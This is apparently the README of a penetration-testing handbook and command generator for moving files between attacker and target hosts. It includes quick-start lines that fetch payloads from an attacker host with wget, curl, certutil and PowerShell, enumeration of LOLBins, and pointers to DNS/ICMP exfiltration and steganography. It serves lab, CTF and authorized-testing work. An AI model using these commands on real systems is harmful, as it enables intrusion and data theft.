<p align="center">
  <img src="assets/banner.webp" alt="File Transfer Arsenal" width="820">
</p>

# File Transfer Arsenal

[English](README.md) · [Русский](README_RU.md)

A practical handbook for moving files between attacker and target: from a plain HTTP server to DNS/ICMP tunnels and steganography. For CPTS, OSCP, CTF, and authorized penetration tests.

**TABULA: 299 methods / 25 channels · 15 handbook sections · 7 ready-to-use scripts**

> **Legend:** 🐧 Linux · 🪟 Windows · 💻 LHOST server

> Educational material. Use it only in your own labs, on CTFs, and within authorized engagements.

## TABULA — online command generator

**Open:** **https://5yn7hp0w3r.github.io/file-transfer-arsenal/**

> GitHub Pages is being enabled. Until the site is live, use the local preview below.

TABULA turns the handbook into a working command sheet for one specific transfer:

1. choose the scenario — deliver, exfiltrate, or both;
2. choose the target OS;
3. choose the channel — HTTP/HTTPS, SMB, FTP, SSH, WebDAV, Netcat/Ncat/Socat, RDP, WinRM, DNS, ICMP, TFTP, SMTP, tunnels, encoding, encryption or steganography;
4. set LHOST/LPORT and the advanced parameters.

The generator then shows only the relevant methods, grouped by family, with LHOST/RHOST commands, install/prepare/start pipelines, copy buttons, hash verification and cleanup. It also warns about special payloads (`.ps1`, `.hta`, `.sct`), registry changes, SMB mount issues, TFTP feature cleanup and similar traps.

- **No backend:** every command is generated in the browser.
- **Search and groups:** filter methods and copy a pair, a family or the whole sheet.
- **Shareable state:** non-secret settings are kept in the URL.
- **Source links:** every method points to the matching GitHub docs file.

Local preview from the repository root:

```bash
python3 -m http.server 8000
```

Open `http://127.0.0.1:8000/tabula/`.

## Handbook

The rest of this README is the handbook behind the generator.

## How to use this

1. Find your situation in the table below.
2. Open the section you need.
3. Commands are tagged `LHOST` / `RHOST`, which tells you which machine to run them on.

## Where to start

| Situation | Section |
|---|---|
| You need to upload a file to the target | [01 - Attacker → Target](docs/en/01-attacker-to-target.md) |
| You need to pull a file off the target | [02 - Target → Attacker](docs/en/02-target-to-attacker.md) |
| You have SSH | [06 - SCP / SFTP](docs/en/06-scp-sftp-rsync.md) |
| No `wget` / `curl` | [07 - Netcat](docs/en/07-netcat.md) · [09 - LOLBins](docs/en/09-lolbins.md) |
| TCP is closed but DNS/ICMP gets through | [12 - DNS / ICMP](docs/en/12-dns-icmp.md) |
| Need to send a binary file as text? | [10 - Encoding](docs/en/10-encoding.md) |
| Need to encrypt a binary file for transfer? | [11 - Encryption](docs/en/11-encryption.md) |
| Need to hide a file? | [13 - Steganography](docs/en/13-stegano.md) |
| Something isn't working | [14 - Troubleshooting](docs/en/14-troubleshooting.md) |

## Quick start

A plain HTTP server covers 80% of the job.

```bash
# LHOST: serve files
python3 -m http.server 80
```

```bash
# RHOST (Linux)
wget http://$LHOST/payload.sh -O /tmp/payload.sh
curl http://$LHOST/payload.sh -o /tmp/payload.sh
```

```cmd
:: RHOST (Windows CMD)
certutil -urlcache -f http://%LHOST%/payload.exe payload.exe
```

```powershell
# RHOST (Windows PowerShell)
iwr "http://${LHOST}/payload.exe" -OutFile payload.exe
```

**Check what's available on a Linux target:**

```bash
for c in bash curl wget python3 python perl php ruby node nc ncat socat openssl ssh tftp busybox git base64 xxd gzip tar; do command -v "$c" >/dev/null 2>&1 && printf '%s ' "$c"; done; echo
```

> If the list comes back empty, you have an almost bare shell: see [07 - Netcat](docs/en/07-netcat.md), [09 - LOLBins](docs/en/09-lolbins.md), and [10 - Encoding](docs/en/10-encoding.md). `/dev/tcp` requires `bash` specifically.

**Check what's available on a Windows target (PowerShell):**

```powershell
'certutil','curl.exe','bitsadmin','certreq','certoc','mshta','regsvr32','msiexec','rundll32','expand','extrac32','findstr','makecab','tar','wsl','winget','ftp','tftp','powershell','pwsh' | ForEach-Object { $c=Get-Command $_ -ErrorAction SilentlyContinue; if($c){ '{0} -> {1}' -f $_,$c.Source } }
```

> `MpCmdRun.exe` and `ConfigSecurityPolicy.exe` live in the Defender folder and are not always on `PATH` — look up their paths in [09 - LOLBins](docs/en/09-lolbins.md). In PowerShell, `curl` without `.exe` is an alias for `Invoke-WebRequest`, so check for `curl.exe` specifically.

## Notation and variables

| Variable | What it is |
|---|---|
| `LHOST` | IP of our machine (attacker) |
| `RHOST` | IP of the remote machine (target) |
| `LHOST_user` | SSH account on our machine |
| `RHOST_user` | SSH account on the target |
| `LHOST SHELL` | the command runs on our machine |
| `RHOST SHELL` | the command runs on the target |

```bash
# Linux / bash
export LHOST=192.168.2.5
export RHOST=192.168.10.20
export LHOST_user=user
export RHOST_user=user
```

```cmd
:: Windows CMD
set LHOST=192.168.2.5
set RHOST=192.168.10.20
set LHOST_user=user
set RHOST_user=user
```

```powershell
# Windows PowerShell
$LHOST = "192.168.2.5"
$RHOST = "192.168.10.20"
$LHOST_user = "user"
$RHOST_user = "user"
```

> In PowerShell, use `${LHOST}` before `:port` in a URL: `"http://${LHOST}:8000/x"`.

## Layout

```text
file-transfer-arsenal/
├── README.md             # this file (English)
├── README_RU.md          # Russian translation
├── docs/en/              # 15 handbook sections (English)
├── docs/ru/              # 15 handbook sections (Russian)
├── scripts/              # ready-to-use scripts
│   ├── upload/serv.py
│   ├── Windows-download-test.ps1
│   ├── Windows-Exfil-tester.ps1
│   └── icmp/icmp_send.py, icmp_recv.py
├── tests/                # unit tests (checksum, HTTP receiver)
├── tabula/               # static command generator (TABULA)
├── assets/               # graphics
├── LICENSE               # MIT (code and command snippets)
└── LICENSE-DOCS          # CC BY 4.0 (documentation)
```

## Sections

| # | Section | What it covers |
|---|---|---|
| 01 | [Attacker → Target](docs/en/01-attacker-to-target.md) | Uploading files to the target |
| 02 | [Target → Attacker](docs/en/02-target-to-attacker.md) | Exfiltration from the target |
| 03 | [SMB](docs/en/03-smb.md) | Two-way transfer over SMB |
| 04 | [WebDAV](docs/en/04-webdav.md) | WebDAV server and mounting |
| 05 | [FTP](docs/en/05-ftp.md) | FTP and non-standard ports |
| 06 | [SCP / SFTP](docs/en/06-scp-sftp-rsync.md) | Transfer over SSH |
| 07 | [Netcat](docs/en/07-netcat.md) | Raw TCP/UDP |
| 08 | [RDP / WinRM](docs/en/08-rdp-winrm.md) | RDP drive, PowerShell Remoting |
| 09 | [LOLBins](docs/en/09-lolbins.md) | Built-in Windows/Linux binaries |
| 10 | [Encoding](docs/en/10-encoding.md) | base64, hex, compression |
| 11 | [Encryption](docs/en/11-encryption.md) | openssl, gpg, age, 7z |
| 12 | [DNS / ICMP](docs/en/12-dns-icmp.md) | dnscat2, iodine, ptunnel-ng, TFTP |
| 13 | [Steganography](docs/en/13-stegano.md) | Images, audio, text, ADS |
| 14 | [Troubleshooting](docs/en/14-troubleshooting.md) | Diagnostics and common errors |
| 15 | [For Blue Team](docs/en/15-for-blue-team.md) | Detection, telemetry, IR |

## Scripts

| Script | What it does |
|---|---|
| [`upload/serv.py`](scripts/upload/serv.py) | HTTP receiver: multipart + raw POST/PUT; configurable port/dir, size limit, token, TLS, SHA-256 |
| [`Windows-download-test.ps1`](scripts/Windows-download-test.ps1) | Windows download tester: first working method; `-NoLogs` = quiet `Done!`; `-Log` = quick log; `-LOLBINS` = safe LOLBins; `-Danger` = danger-only; `-All` = full safe matrix + log |
| [`Windows-Exfil-tester.ps1`](scripts/Windows-Exfil-tester.ps1) | Windows exfil tester: sends a file to a Kali receiver; first success; `-Receiver` profile; `-All` = matrix + log |
| [`Linux-download-test.py`](scripts/Linux-download-test.py) | Linux download tester: curl/wget/Python/Perl/PHP/Ruby/Node/bash/busybox/aria2c/axel; `--all` = matrix + log/CSV |
| [`Linux-exfil-test.py`](scripts/Linux-exfil-test.py) | Linux exfil tester: uploadserver, serv.py, nginx, WebDAV, FTP, SMB, raw TCP; `--all` = matrix + log/CSV |
| [`icmp/icmp_send.py`](scripts/icmp/icmp_send.py) | Sends a file in ICMP echo requests |
| [`icmp/icmp_recv.py`](scripts/icmp/icmp_recv.py) | Receives and reassembles a file from ICMP |

> **Safety:** run the tester only on an isolated, authorized test host. `-Danger` is not for production - it changes lockscreen/registry and writes to INetCache/CryptnetUrlCache. The default mode and `-All` exclude danger-tagged methods.

> External: the AES helper `Invoke-AESEncryption.ps1` is not bundled. See [11 - Encryption](docs/en/11-encryption.md#powershell-aes-no-install) and the [author's gist](https://gist.github.com/ddumicz/909d98a0e794a42326d5fcd6d9f2c4ad).

Details are in [`scripts/README.md`](scripts/README.md).

## Integrity check

```bash
sha256sum secrets.zip
```

```powershell
Get-FileHash secrets.zip -Algorithm SHA256
```

```cmd
certutil -hashfile secrets.zip SHA256
```

## Scope

This material is intended for authorized tests, CTFs, and isolated labs. The author is not responsible for use outside those bounds.

## Verification and limitations

Most of the material has been verified by the author in a lab. AI was used as an assistant while preparing the text, structure, and some examples — that does not replace testing the commands on your own Windows/Linux version and in your own infrastructure.

The Python unit tests (checksum and HTTP receiver) run without root or scapy: `python3 -m unittest discover -s tests -v`.

If you find a bug, an outdated command, or an inaccuracy, open an Issue or send a Pull Request. Especially useful:

- testing commands on a different OS or tool version;
- fixes to syntax and paths;
- new techniques that work, with confirmation;
- detection notes for blue teams;
- link and typo fixes.

## License

- **Code and command snippets** (everything under `scripts/`, plus commands in the docs): MIT — see [LICENSE](LICENSE).
- **Documentation and prose** (README files and `docs/`): CC BY 4.0 — see [LICENSE-DOCS](LICENSE-DOCS).
- **Third-party components and community credits**: see [Credits](#credits); they remain under their own terms.

If you publish a derivative version, credit the author and link to the original repository. The attribution suggested in `LICENSE-DOCS` covers the documentation; keep the MIT copyright notice for code.

## Credits

Author: **synthpowersec**.

### Third-party and community

- **ddumicz** — author of [`Invoke-AESEncryption.ps1`](https://gist.github.com/ddumicz/909d98a0e794a42326d5fcd6d9f2c4ad). The script is not bundled with this repository; the gist does not state an explicit license, so treat it as third-party code and check the terms with the author before redistributing.
- [**GTFOBins**](https://gtfobins.github.io/) — a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems. Source: <https://github.com/GTFOBins/GTFOBins.github.io>.
- [**LOLBAS**](https://lolbas-project.github.io/) — the Living Off The Land Binaries, Scripts and Libraries project for Windows. Source: <https://github.com/LOLBAS-Project/LOLBAS>.

Huge thanks to the maintainers and contributors of these projects, and to everyone who reports issues, shares techniques, writes detections, and contributes to open security projects — you make the community and the systems we defend safer. ❤️

## Support the project

If this material was useful: [Boosty](https://boosty.to/synthpowersec).
